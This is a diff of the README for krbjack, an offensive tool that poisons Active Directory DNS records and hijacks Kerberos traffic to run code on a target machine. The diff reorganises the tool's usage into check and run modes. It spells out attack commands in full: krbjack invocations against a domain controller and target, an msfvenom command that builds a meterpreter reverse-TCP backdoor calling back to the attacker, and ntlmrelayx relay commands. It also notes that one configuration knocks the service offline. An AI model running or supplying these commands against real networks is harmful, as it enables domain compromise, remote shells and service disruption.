@@ -6,7 +6,7 @@ The benefit from using this technique of man in the middle is that it goes throu
 
 Moreover I made the choice to perform fully functionnal AP_REQ hijacking to allow compromission of systems using kerberos instead of NetNTLM.
 
-![image](https://user-images.githubusercontent.com/9830129/235469315-a77c5875-393e-40db-8301-e006013cc98f.png)
+![image](assets/Krbjack_README.png)
 
 
 # Install
@@ -19,12 +19,26 @@ You do need to install the tool with root rights as it will need to be runnable 
 
 # Usage
 
-`sudo krbjack --target-name <targetNBTName> [--target-ip <targetIP>] --domain <domainName> --dc-ip <domainControlerIpAddress> --ports <port1,port2,port3,...> --executable <executable.exe>`
+```sudo krbjack { check | run --target-name <targetNBTName> --target-ip <targetIP> --ports <port1,port2,port3,...> --executable <executable.exe> [--no-poison] } --domain <domainName> --dc-ip <domainControlerIpAddress> [--help]```
 
-- `--target-name` : The netbios name of your target, the one you will impersonate, the one you want will pwn if successful. Example : `winserv2`;
-- `--target-ip` : You might want to specify the IP address of your target. The alternative is to let this tool query the DNS to get its IP addresses. A quick naive scan is performed to choose one IP from the ones returned by the DNS though this method is flawed. Example: `192.168.42.20`;
-- `--domain` : The domain name to which your target is joined. Example : `windomain.local`;
-- `--dc-ip` : The IP address of the domain controller you will be poisoning DNS records. Can be any domain controller as the DNS zones will be replicated automatically. Example : `192.168.42.10`;
+krbjack is currently working with two modes : 
+
+## Check mode
+
+```krbjack check --domain DOMAIN --dc-ip DC_IP [-h]```
+
+- `--domain` : The domain name to which your target is joined. Example : `windomain.local`
+
+- `--dc-ip` : The IP address of the domain controller you will be poisoning DNS records. Can be any domain controller as the DNS zones will be replicated automatically. Example : `192.168.42.10`
+
+## Run mode
+
+```krbjack run  --domain DOMAIN --dc-ip DC_IP --target-name TARGET_NAME --target-ip TARGET_IP --ports PORTS --executable EXECUTABLE [--no-poison] [-h]```
+
+- `--domain` : The domain name to which your target is joined. Example : `windomain.local`
+- `--dc-ip` : The IP address of the domain controller you will be poisoning DNS records. Can be any domain controller as the DNS zones will be replicated automatically. Example : `192.168.42.10`
+- `--target-name` : The netbios name of your target, the one you will impersonate, the one you want will pwn if successful. Example : `winserv2`
+- `--target-ip` : You might want to specify the IP address of your target. The alternative is to let this tool query the DNS to get its IP addresses. A quick naive scan is performed to choose one IP from the ones returned by the DNS though this method is flawed. Example: `192.168.42.20`
 - `--ports` : An optional list of TCP ports which will be open on your attacker's machine to forward traffic to your target. This list is *very* important because if you omit one port which is open on the legitimate service (your target), clients wont be able to access it during the time of the attack. Setting this list of ports correctly is the key to perform the attack without doing to much of a mess in the network. Example : `135,139,445,80,443,8080`
 - `--executable <executable.exe>` : An optional path to an executable on your attacker's machine. This executable will be uploaded and executed psexec-style on your target if the attack succeeds. Example : `/home/almandin/metx64revtcp.exe`.
 
@@ -33,17 +47,14 @@ You do need to install the tool with root rights as it will need to be runnable 
     If you use a windows service executable, you're good to go, nothing to add here. You can generate such executables with msfvenom with the `exe-service` format:
 
         msfvenom -f exe-service -o backdoor.exe -p windows/x64/meterpreter/reverse_tcp LHOST=X LPORT=Y
-
-**Additionnal flags :**
-
-- `--check` : Used to performs no attack at all, just to check if the DNS zone is vulnerable.
-- `--no-poison` : Can  be used to set all the mess in place but prevent DNS poisoning from being done. Just in case you managed to poison DNS yourself or if you found another way to point clients to you instead of the legitimate service.
+        
+- `--no-poison` : Additionnal flag that can  be used to set all the mess in place but prevent DNS poisoning from being done. Just in case you managed to poison DNS yourself or if you found another way to point clients to you instead of the legitimate service.
 
 ## Alternative use cases
 
 You can use krbjack to only poison dns records, or in combination to ntlmrelayx as well. If you do not specify any executable, no remote code execution will be performed, only dns poisonning will be performed. You can use this and specify ports to forward to catch traffic between your target and any system that tries to reach it by DNS name.
 
-If you do not provide any ports, no tcp forwarding will be performed. This enables to use ntlmrelayx with an unsecure dns update abuse. Example : `krbjack --target-name winserv --domain windomain.local --dc-ip 10.0.0.1`. This will start dns poisonning. At the same time you can start ntlmrelayx : `ntlmrelayx.py -t 10.0.0.42 -smb2support` to try to execute code to the 10.0.0.42 machine. Note that without any tcp forwarding enabled, a full denial of service is performed...
+If you do not provide any ports, no tcp forwarding will be performed. This enables to use ntlmrelayx with an unsecure dns update abuse. Example : `krbjack run --target-name winserv --domain windomain.local --dc-ip 10.0.0.1`. This will start dns poisonning. At the same time you can start ntlmrelayx : `ntlmrelayx.py -t 10.0.0.42 -smb2support` to try to execute code to the 10.0.0.42 machine. Note that without any tcp forwarding enabled, a full denial of service is performed...
 
 ## What are the requirements for this to work ?
 
